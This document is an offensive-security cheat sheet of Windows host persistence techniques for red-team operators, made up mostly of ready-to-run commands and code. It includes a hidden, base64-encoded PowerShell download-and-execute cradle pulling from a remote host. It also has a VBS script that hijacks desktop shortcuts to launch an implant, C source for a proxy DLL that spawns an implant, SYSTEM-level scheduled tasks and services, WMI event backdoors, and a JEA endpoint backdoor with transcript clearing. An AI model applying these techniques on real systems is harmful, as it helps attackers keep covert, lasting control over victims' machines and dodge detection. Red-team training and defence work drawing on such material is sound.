# Host Persistence
* [User land](#User-land)
  * [Startup folder](#Startup-folder)
  * [Registry keys](#Registry-keys)
  * [Scheduled task](#Scheduled-task)
  * [Logon Scripts](#Logon-Scripts)
  * [Shortcut modifications](#Shortcut-modifications)
  * [Screensaver](#Screensaver)
  * [PowerShell Profile](#PowerShell-Profile)
  * [DLL Proxying/hijacking](#DLL-Proxying/hijacking)
  * [COM Proxying/hijacking](#COM-Proxying/hijacking)
  * [Microsoft Office Trusted Locations](#Microsoft-Office-Trusted-Locations)
* [Elevated](#Elevated)
  * [Service](#Service)
  * [Schtasks](#Schtasks2)
  * [WMI](#WMI)
  * [Just Enough Admin](#Just-Enough-Admin)

## Persistence
- Its important to implement a control mechanism in the payloads to stop multiple executions via for example mutex, file, event or something similar

## Userland
- Persistence methods for low privilege persistence

### Startup folder 
- Runs when they log in

#### Copy payload to startup folder
```
copy <PATH TO EXE> "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
```
- For cleanup delete the file again

#### SharpPersist
```
str='IEX ((new-object net.webclient).downloadstring("http://x.x.x.x/a"))'
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))

SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <BASE64>" -f "UserEnvSetup" -m add
```

### Registry keys
- Run applications on boot
- There are more keys, read [Mitre](https://attack.mitre.org/techniques/T1547/001/)

#### Query and set reg key
- Can use `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run` or `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce`
```
reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v MSUpdate /t REG_SZ /d <PATH TO EXE> /f
```
- Cleanup `reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v MSUpdate /f`

#### Launch programs or set folder items
```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders     
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders 
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders     
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
```

#### SharpPersist
- ```-k``` is the registry key to modify.
- ```-v``` is the name of the registry key to create.
```
SharPersist.exe -t reg -c "<PATH TO EXE>" -a "/q /n" -k "hkcurun" -v "MSUpdate" -m add
```

### Scheduled task
#### Create, Query and run task
```
schtasks /create /tn "MSUpdate" /sc daily /st 10:00 /tr "<PATH TO EXE>"
schtasks /query /tn "MSUpdate" /fo:list /v
schtasks /run /tn "MSUpdate"
```

#### Create task the user session is idle for 10 minutes
```
schtasks /create /tn "MSUpdate" /tr "<PATH TO EXE>" /sc onidle /i 10
schtasks /query /tn "MSUpdate" /fo:list /v
schtasks /run /tn "MSUpdate"
```

### Logon Scripts
- Script will run on logon of a user. Might not run instantly because of logon script startup delay.

#### Query and set reg key
```
reg query "HKEY_CURRENT_USER\Environment"

reg add "HKEY_CURRENT_USER\Environment" /v UserInitMprLogonScript /d "<PATH TO BAT FILE>" /t REG_SZ /f
```

- Bath file
```
@ECHO OFF

<PATH TO EXE>
```
- Cleanup `reg delete "HKEY_CURRENT_USER\Environment" /v UserInitMprLogonScript`

### Shortcut modifications
- Modify shortcuts from programs that are frequently used.

#### Run the following VBS script
- Preserves the original functionality. Will replace link with `newTarget` which will run the implant and then the orginal program
- Run it with `wscript <SCRIPT>`
```
' CONFIGURATION
implant = "C:\implant.exe"
newTarget = "C:\putty.vbs"
lnkName = "putty.exe.lnk"

' helper vars
set WshShell = WScript.CreateObject("WScript.Shell" )
strDesktop = WshShell.SpecialFolders("Desktop" )
set oShellLink = WshShell.CreateShortcut(strDesktop & "\" & lnkName )
origTarget = oShellLink.TargetPath
origArgs = oShellLink.Arguments
origIcon = oShellLink.IconLocation
origDir = oShellLink.WorkingDirectory

' persistence implantation
Set FSO = CreateObject("Scripting.FileSystemObject")
Set File = FSO.CreateTextFile(newTarget,True)
File.Write "Set oShell = WScript.CreateObject(" & chr(34) & "WScript.Shell" & chr(34) & ")" & vbCrLf
File.Write "oShell.Run " & chr(34) & implant & chr(34) & vbCrLf
File.Write "oShell.Run " & chr(34) & oShellLink.TargetPath & " " & oShellLink.Arguments & chr(34) & vbCrLf
File.Close

oShellLink.TargetPath = newTarget
oShellLink.IconLocation = origTarget & ", 0"
oShellLink.WorkingDirectory = origDir
oShellLink.WindowStyle = 7
oShellLink.Save

```

### Screensaver
- Might not work if screensaver is already set over GPO

#### Query and set reg key
```
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "SCRNSAVE.EXE" /t REG_SZ /d "<PATH TO EXE>" /f
removal:
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "SCRNSAVE.EXE" /t REG_SZ /d "" /f
```

#### Query and change screensave timeout
- Time in seconds
```
reg query "HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveTimeOut" 

reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "ScreenSaveTimeOut" /t REG_SZ /d "10" /f
```
- Cleanup `reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "SCRNSAVE.EXE" /t REG_SZ /d "" /f`

### PowerShell Profile
- Only works when PowerShell is started on the machine. Will work for example if a logonscript is run with PowerShell

#### Dir profile path
```
dir %HOMEPATH%\Documents\windowspowershell\
```

#### Create WindowPowerShell directory
- If it doesn't exist
```
mkdir %HOMEPATH%\Documents\windowspowershell\
```

#### Create profile
```
echo <PATH TO EXE> > "%HOMEPATH%"\Documents\windowspowershell\profile.ps1"
```

#### Add to existing profile
```
echo <PATH TO EXE> >> "%HOMEPATH%"\Documents\windowspowershell\<PROFILE>"
```

#### Cleanup
```
rem %HOMEPATH%"\Documents\windowspowershell\profile.ps1
```

### DLL Proxying/hijacking
- DLL Hijacking might break the application. Creating a proxy module which will run the implant and then run the legitimate DLL.
- DLL Search order for Desktop Apps:
	- DLL already in memory
	- `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`
	- App's directory
	- `C:\Windows\System32` | `SysWow64`
	- `C:\Windows\System`
	- `C:\Windows\`
	- Current directory
	- `%PATH%

#### Find Program to Hijack
- Need write permissions to place DLL in the App's directory.
```
icacls <PATH TO EXE DIR>
```

#### Download everything locally

#### Check for DLL to proxy/hijack
- Start [ProcMon](https://learn.microsoft.com/nl-nl/sysinternals/downloads/procmon
- Set two filters
	- `Result, contains, NOT FOUND, Include`
	- `Process Name, contains, <PROCESS/PROGRAM NAME>, Include`
- Start the Program
- Check for DLL's which are not found.
- Open process hacker and go to Modules, then check if the DLL NOT FOUND is still loaded.
	- The message is showing because it couldn't find it in the first path but it did in another folder
- Turn off filter to check it was found.
- Choosing a DLL
	- Check for imported DLL's with dumpbin. `dumpbin /imports <PATH TO EXE>`
	- Look for a DLL Without a lot of functions

#### Create proxy DLL
- Possible to make your own C code and injector in the Go function.
```
#include <Windows.h>

void Go(void) {
    STARTUPINFO info={sizeof(info)};
    PROCESS_INFORMATION processInfo;

        CreateProcess(
					"<PATH TO EXE>", 
					"", NULL, NULL, TRUE, 0, NULL, NULL, 
					&info, &processInfo);
	
}

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {

    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
		Go();
		break;
    case DLL_THREAD_ATTACH:
		break;
    case DLL_THREAD_DETACH:
		break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

- Add original function linkers, example. Add the ordinal number of the function from dumpbin. (Convert hex to decimal)
- Where `winsplhlp` is a copy of the original DLL
```
#pragma comment(linker,"/export:OpenPrinterA=winsplhlp.OpenPrinterA,@143")
```

- Compile
	- Make sure compile it to the correct architecture
```
cl.exe /W0 /D_USRDLL /D_WINDLL <FILE NAME>.cpp /MT /link /DLL /OUT:<OUT DLL NAME>
```

- Print exports of DLL
```
dumpbin /exports <OUT DLL NAME>
```

- Copy original DLL to DLL used in linker
```
cp <ORIGINAL DLL>.dll <PATH TO PROGRAM>\<DLL NAME SET IN LINKER>.dll
```

- Program might still crash if specific functions from the DLL are used that didn't show in the import table. Get all the exported functions:
```
dumpbin /exports <PATH TO ORIGINAL DLL>
```

- Create linker for every function! If there are functions without names use the ordinals with the following syntact
```
#pragma comment(linker,"/export:NONAME=winsplhlp.#100,@100,NONAME")
```

### COM Proxying/hijacking
- COM loads from the user registry and then from the system. So looking up a reg key it loads from the system hive and adding it in the user hive will make it load that reg key first.
- COM registery can be found in `<HIVE>\SOFTWARE\Classes\CLSID` Where `<HIVE>` is the `HKCR`, `HKCU` or `HKLM`

#### Check for COM to hijack
- Query scheduled tasks. Look for something as `<ComHandler>` instead if the `<Exec>` tags and `<LogonTrigger>` in `<Triggers>`
```
schtasks /query /xml > tasks.xml
```

- Query the HKCR to see which DLL and then the HKCU and HKLM to check where the reg key is set. If HKLM then its exploitable by adding a HKCU.
```
reg query "HKCR\CLSID\{<ID>}"
reg query "HKCR\CLSID\{<ID>}\Inprocserver32"

reg query "HKCU\SOFTWARE\Classes\CLSID\{<ID>}"
reg query "HKLM\SOFTWARE\Classes\CLSID\{<ID>}"
```

- Export key
```
reg export "HKLM\SOFTWARE\Classes\CLSID\{<ID>}" tsk-orig.reg /reg:64 /y
```

### Microsoft Office Trusted Locations
- Allow DLL or macros to execute despite the configured security settings (Ignored if macro's or add-ins have been blocked by GPO)
- Create a new Excel document with a module containing the persistence mechanism. Save it as "Excel Add-in" inside ```%APPDATA%\Microsoft\Excel\XLSTART``` and it will be launched every time the user opens MS Excel application.
- https://labs.f-secure.com/archive/add-in-opportunities-for-office-persistence/

## Elevated
- Persistence methods for high privileged persistence

### Service
- Create service running as SYSTEM, service is in a stopped state, but with the START_TYPE set to AUTO_START. 
```
.\SharPersist.exe -t service -c "<PATH TO EXE>" -n "<SERVICE NAME>" -m add
```

### Schtasks2
- Run task as system each time a user logs in
```
schtasks /create /ru "NT AUTHORITY\SYSTEM" /rp "" /tn "<TASK NAME>" /tr <PATH TO EXE> /sc onlogon
```

## WMI
- Persistence can be achieved with `EventConsumer`, `EventFiler`, `FilterToConsumerBinding`
- https://github.com/Sw4mpf0x/PowerLurk

```
Import-Module PowerLurk.ps1
Register-MaliciousWmiEvent -EventName <EVENT NAME> -PermanentCommand "<PATH TO EXE>" -Trigger ProcessStart -ProcessName notepad.exe
```

### Just Enough Admin
- If we have admin privileges on a machine, we can create a JEA endpoint which allows all commands to a user we control.
- With this capability, it is also possible to clear the transcripts for this endpoint. 

#### Create a new JEA endpoint
- https://github.com/samratashok/RACE

```
Set-JEAPermissions -ComputerName ops-dc -SamAccountName <USER> -Verbose
```

#### Connect to JEA endpoint
```
Enter-PSSession -ComputerName ops-dc -ConfigurationName microsoft.powershell64
```
